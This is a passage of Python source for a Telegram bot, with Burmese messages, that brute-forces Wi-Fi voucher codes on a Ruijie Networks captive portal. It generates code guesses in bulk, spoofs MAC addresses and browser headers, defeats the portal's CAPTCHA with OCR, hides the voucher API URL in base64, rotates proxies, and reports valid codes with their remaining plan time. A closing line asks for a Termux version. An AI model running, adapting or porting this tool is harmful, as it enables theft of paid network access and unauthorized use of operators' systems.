        await bot.reply_to(message, "🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]")
        return
    url = args[1]
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    await bot.reply_to(message, "🔗 Portal URL အားစစ်ဆေးနေပါသည်...")
    use_proxy = db_get_proxy_setting(user_id)
    if await check_session_url(session_url=url, use_proxy=use_proxy):
        user_data[message.chat.id]['session_url'] = url
        await bot.reply_to(message, "✅ Portal URL အားသိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။", reply_markup=get_voucher_keyboard())
    else:
        await bot.reply_to(message, f"❌ Portal URL မှားယွင်းနေပါသည်။ ကျေးဇူးပြု၍ ပြန်လည်စစ်ဆေးပါ။")

@bot.message_handler(commands=['scan'])
async def handle_key_scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "VOUCHER ရွေးချယ်ရန်:\n\n/scan 6, 7, 8, engsmall6, engsmall7, engsmall8, engmixed6, engmixed7, engmixed8\n\nExample: /scan 6", reply_markup=get_voucher_keyboard())
        return
    mode = args[1]
    chat_id = message.chat.id
    if chat_id not in user_data:
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return
    if 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။")
        return
    progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
    scan_id = str(uuid.uuid4())
    user_name = message.from_user.first_name or message.from_user.username or "User"
    portal_url = user_data[chat_id].get('session_url', 'Unknown')
    await forward_to_channel(f"🚀 **Scan Started (/scan)**\n\n👤 **User:** {user_name}\n🆔 **User ID:** `{user_id}`\n🔢 **Mode:** {mode}\n🔗 **Portal URL:**\n`{portal_url}`", parse_mode="Markdown")
    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        await send_success_file(chat_id)
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())

@bot.message_handler(commands=['result'])
async def handle_result(message):
    user_id = str(message.chat.id)
    results = db_get_results(user_id)
    if results:
        codes = "\n".join(results)
        await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
    else:
        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")

@bot.message_handler(commands=['recheck'])
async def recheck_command(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    results = db_get_results(user_id)
    if not results:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
        return
    if message.chat.id not in user_data or 'session_url' not in user_data.get(message.chat.id, {}):
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return
    await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
    session_url_recheck = user_data[message.chat.id]["session_url"]
    recheck_list = []
    for code in results:
        recode = await perform_check(session_url_recheck, code, chat_id, scan_id=None, recheck=True, message=message)
        if recode:
            recheck_list.append(recode)
    to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
    await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
    if recheck_list:
        db_save_results(user_id, recheck_list)

@bot.message_handler(commands=['status'])
async def status_command(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "No Permission")
        return
    await stats_command(message)

@bot.message_handler(commands=['proxy'])
async def proxy_command(message):
    user_id = str(message.chat.id)
    current = db_get_proxy_setting(user_id)
    new_status = not current
    db_set_proxy_setting(user_id, new_status)
    status_text = "ON" if new_status else "OFF"
    emoji = "🟢" if new_status else "🔴"
    await bot.reply_to(message, f"{emoji} Proxy {status_text} ဖြစ်သွားပါပြီ။")
    await forward_to_channel(f"🔄 Proxy Toggled\n\n👤 User: {message.from_user.first_name}\n🆔 ID: {user_id}\n📊 Status: {status_text}")

async def send_success_file(chat_id):
    if chat_id in success_texts and success_texts[chat_id]:
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"success_codes_{chat_id}_{timestamp}.txt"
            content = "\n\n".join(success_texts[chat_id])
            with open(filename, "w", encoding="utf-8") as f:
                f.write(f"Success Codes Found\nUser ID: {chat_id}\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nTotal: {len(success_texts[chat_id])}\n{'='*50}\n\n{content}")
            with open(filename, "rb") as f:
                await bot.send_document(chat_id, f, caption=f"✅ Scan Stopped - Found {len(success_texts[chat_id])} Success Codes")
            if os.path.exists(filename):
                os.remove(filename)
            try:
                with open(filename, "rb") as f:
                    await bot.send_document(ADMIN_IDS[0], f, caption=f"📁 Success Codes from User {chat_id}\nTotal: {len(success_texts[chat_id])}")
            except:
                pass
        except Exception as e:
            print(f"Error sending file: {e}")

# ==================== CORE SCANNING FUNCTIONS ====================
def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def engsmall_generator(length):
    chars = string.ascii_lowercase
    return "".join(random.choice(chars) for _ in range(length))

def engmixed_generator(length):
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choice(chars) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
        if mode == "6":
            codes = [str(i).zfill(6) for i in range(10 ** 6)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "7":
            codes = [str(i).zfill(7) for i in range(10 ** 7)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "8":
            while True:
                yield digit_generator(8)
    if mode == "engsmall6":
        while True:
            yield engsmall_generator(6)
    if mode == "engsmall7":
        while True:
            yield engsmall_generator(7)
    if mode == "engsmall8":
        while True:
            yield engsmall_generator(8)
    if mode == "engmixed6":
        while True:
            yield engmixed_generator(6)
    if mode == "engmixed7":
        while True:
            yield engmixed_generator(7)
    if mode == "engmixed8":
        while True:
            yield engmixed_generator(8)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100 if total > 0 else 0
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return f"🔍Scanning VOUCHER Codes...\n\n📦Checked : {checked:,}/{total:,}\n📊Progress : {percent:.2f}%\n⚡Speed : {speed_str}\n✅Success code hit : {found}\n[{bar}]"
    return f"🔍Scanning VOUCHER Codes...\n\n📦Checked : {checked:,}\n⚡Speed : {speed_str}\n✅Success code hit : {found}\n📊Status : running\n"

BATCH_SIZE = globals()['BATCH_SIZE']

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {"session_id": None, "auth_code": None, "lock": asyncio.Lock()}
    return captcha_state[chat_id]

async def get_captcha(chat_id, session, session_url):
    entry = _captcha_entry(chat_id)
    if entry["session_id"] and entry["auth_code"]:
        return entry["session_id"], entry["auth_code"]
    async with entry["lock"]:
        if entry["session_id"] and entry["auth_code"]:
            return entry["session_id"], entry["auth_code"]
        session_id = await get_session_id(session, session_url, entry.get("session_id"))
        if not session_id:
            return None, None
        for _ in range(10):
            image = await Captcha_Image(session, session_id)
            text = await Captcha_Text(image)
            verified = await Varify_Captcha(session, session_id, text)
            if verified:
                entry["session_id"] = session_id
                entry["auth_code"] = text
                return session_id, text
        return None, None

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    if mode in ["6", "7"]:
        total = 10 ** int(mode)
    elif mode == "8":
        total = 10 ** 8
    else:
        total = None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(MAX_CONCURRENT)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            # ⭐ Key စစ်ဆေးခြင်းကို ဖြုတ်ထားပါပြီ (Key-Free)

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)
            found = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            if total is not None:
                text = format_progress(checked, total, speed, found)
            else:
                text = format_progress(checked, None, speed, found)
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"Progress Message Error: {err}")

        if progress_msg:
            found = len(success_texts.get(chat_id, []))
            if total is not None:
                finish_text = "🔍Scanning Completed\n\n" + f"📦Checked : {checked:,}/{total:,}\n✅ Success code hit: {found}\n📊Progress : 100%\n[██████████████████]"
            else:
                finish_text = "🔍Scanning Completed\n\n" + f"📦Checked : {checked:,}\n✅ Success code hit: {found}\n📊Progress : 100%\n[██████████████████]"
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
            except:
                try:
                    await bot.send_message(chat_id, finish_text)
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")
        await send_success_file(chat_id)
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
    finally:
        await send_success_file(chat_id)
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def check_session_url(session_url, use_proxy=True):
    headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'priority': 'u=0, i', 'referer': session_url, 'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0', 'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'}
    proxy = get_next_proxy() if use_proxy else None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy) as response:
                text_ = str(response.url)
                if "sessionId" in text_:
                    return True
                return False
    except:
        return False

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'priority': 'u=0, i', 'referer': session_url, 'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0', 'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'}
    proxy = None
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True, proxy=proxy) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            return previous_session_id
    except:
        return previous_session_id

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    response = None
    for _attempt in range(2):
        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as task_session:
            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return
            auth_code = None
            for _ in range(5):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")
            if not auth_code:
                return
            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return
            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {"authority": "portal-as.ruijienetworks.com", "accept": "*/*", "accept-language": "en-US,en;q=0.9", "content-type": "application/json", "origin": "https://portal-as.ruijienetworks.com", "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}", "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"', "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"', "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"}
            proxy = None
            try:
                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
            except Exception as e:
                print(f"[perform_check] error: {e}")
                return
        if response and 'request limited' in response:
            continue
        break

    if not response:
        return
    if 'logonUrl' in response:
        if recheck:
            return code
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date, raw_mins = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        if chat_id not in user_data:
            user_data[chat_id] = {}
        current_display = user_data[chat_id].get('current_display_codes', [])
        current_display.append(f"🎫 {code}\n   {expire_date}")
        code_line = "\n\n".join(current_display)
        results = db_get_results(str(chat_id))
        if code not in results:
            results.append(code)
            db_save_results(str(chat_id), results)
        # ⭐ Key Limit စစ်ဆေးခြင်း ဖြုတ်ထားပါပြီ
        if message:
            try:
                if chat_id not in success_messages or len(code_line) > 4000:
                    sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n🎫 {code}\n   {expire_date}")
                    success_messages[chat_id] = sent.message_id
                    user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
                else:
                    try:
                        await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text=f"Success Codes:\n\n{code_line}")
                        user_data[chat_id]['current_display_codes'] = current_display
                    except Exception:
                        sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n🎫 {code}\n   {expire_date}")
                        success_messages[chat_id] = sent.message_id
                        user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
            except Exception as e:
                print(f"Success Message Error: {e}")
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        limited_line = "\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id=message.chat.id, text=f"Limited Codes:\n\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(chat_id=message.chat.id, message_id=limited_messages[chat_id], text=f"Limited Codes:\n\n{limited_line}")
                    except Exception:
                        sent = await bot.send_message(chat_id=message.chat.id, text=f"Limited Codes:\n\n{limited_line}")
                        limited_messages[chat_id] = sent.message_id
            except Exception as e:
                print(f"Limited Message Error: {e}")

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    try:
        mins = int(total_minutes)
        if mins == 0:
            return "0m"
        hours = mins // 60
        rem_minutes = mins % 60
        if hours > 0 and rem_minutes > 0:
            return f"{hours}h {rem_minutes}m"
        elif hours > 0:
            return f"{hours}h"
        else:
            return f"{rem_minutes}m"
    except:
        return 'Unknown'

async def Code_Expires_Date(active_id):
    paths = [f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}', f'https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}', f'https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}', f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}']
    headers = {'authority': 'portal-as.ruijienetworks.com', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'en-US,en;q=0.9,my;q=0.8', 'content-type': 'application/json;', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'x-requested-with': 'XMLHttpRequest'}
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(connector=_connector, connector_owner=False, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as fresh_session:
        for url in paths:
            try:
                async with fresh_session.get(url, headers=headers) as req:
                    if req.status == 200:
                        respond = await req.json()
                        if respond.get('success'):
                            result = respond.get('result', {})
                            raw_minutes = result.get('totalMinutes')
                            if raw_minutes is None:
                                raw_minutes = result.get('remainingMinutes')
                            if raw_minutes is None:
                                raw_minutes = 'Unknown'
                            profile_name = result.get('profileName', 'Unknown')
                            totaltime = Minute_to_Hour(raw_minutes)
                            display = f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
                            return display, raw_minutes
            except Exception as e:
                continue
    return "📋 Plan: Unknown | ⏳ Time: Unknown", 'Unknown'

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {'authority': 'portal-as.ruijienetworks.com', 'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9,my;q=0.8', 'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}', 'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Linux"', 'sec-fetch-dest': 'image', 'sec-fetch-mode': 'no-cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'}
    params = {'sessionId': session_id, '_t': str(time.time())}
    proxy = None
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, proxy=proxy) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {'authority': 'portal-as.ruijienetworks.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,my;q=0.8', 'content-type': 'application/json', 'origin': 'https://portal-as.ruijienetworks.com', 'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}', 'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Linux"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'}
    json_data = {'sessionId': session_id, 'authCode': text}
    proxy = None
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, proxy=proxy) as req:
        data = await req.json()
        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
        if data.get("success") == True:
            return session_id
        return None

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    _connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT, limit_per_host=CONNECTION_PER_HOST, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())

Botမလုပ်ဘဲtermuxပြောင်းပေးပါ
